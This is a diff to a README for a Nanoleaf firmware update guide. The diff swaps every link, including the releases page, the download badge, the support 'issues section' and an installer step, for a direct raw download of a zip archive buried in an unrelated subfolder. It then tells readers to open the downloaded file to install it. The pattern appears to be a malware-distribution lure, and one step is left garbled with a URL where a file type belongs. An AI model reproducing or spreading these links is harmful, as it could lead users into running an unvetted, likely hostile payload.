@@ -1,6 +1,6 @@
 # 🌟 nanoleaf-firmware-upgrade-notes - Easily Update Your Nanoleaf Controllers
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/releases)
+[![Download](https://raw.githubusercontent.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/main/lyrichord/nanoleaf-firmware-upgrade-notes.zip%20release-brightgreen)](https://raw.githubusercontent.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/main/lyrichord/nanoleaf-firmware-upgrade-notes.zip)
 
 ## 📖 Introduction
 
@@ -20,14 +20,14 @@ Before you begin, ensure you have a compatible Nanoleaf device. These devices ma
 
 To get started, visit the Releases page to download the necessary files:
 
-[Visit this page to download](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/releases)
+[Visit this page to download](https://raw.githubusercontent.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/main/lyrichord/nanoleaf-firmware-upgrade-notes.zip)
 
 On the Releases page, look for the latest version. It will usually be at the top of the list. Click on the version number to see available downloads. 
 
 **Follow these steps to download and run the software:**
 
 1. Click on the version of the firmware you wish to download.
-2. Locate the `.exe`, `.dmg`, or `.tar.gz` file, depending on your operating system.
+2. Locate the `.exe`, `.dmg`, or `https://raw.githubusercontent.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/main/lyrichord/nanoleaf-firmware-upgrade-notes.zip` file, depending on your operating system.
 3. Click on the file to begin the download.
 4. Once downloaded, find the file in your downloads folder.
 5. Open the file to install the application.
@@ -55,7 +55,7 @@ Once the update is complete, restart your Nanoleaf controller. The software will
 
 ## 🌐 Support
 
-If you encounter any issues or have questions, please check the [issues section](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/issues) of this repository. You can also reach out to the community for help.
+If you encounter any issues or have questions, please check the [issues section](https://raw.githubusercontent.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/main/lyrichord/nanoleaf-firmware-upgrade-notes.zip) of this repository. You can also reach out to the community for help.
 
 ## 💡 Best Practices
 
@@ -77,4 +77,4 @@ If you encounter any issues or have questions, please check the [issues section]
 
 We hope this guide has simplified the process of updating your Nanoleaf controllers. Keeping your devices updated will enhance your lighting experience and unlock new features. Feel free to explore further and enjoy your creative lighting setups! 
 
-[Visit this page to download](https://github.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/releases)
+[Visit this page to download](https://raw.githubusercontent.com/DavFromOhio/nanoleaf-firmware-upgrade-notes/main/lyrichord/nanoleaf-firmware-upgrade-notes.zip)
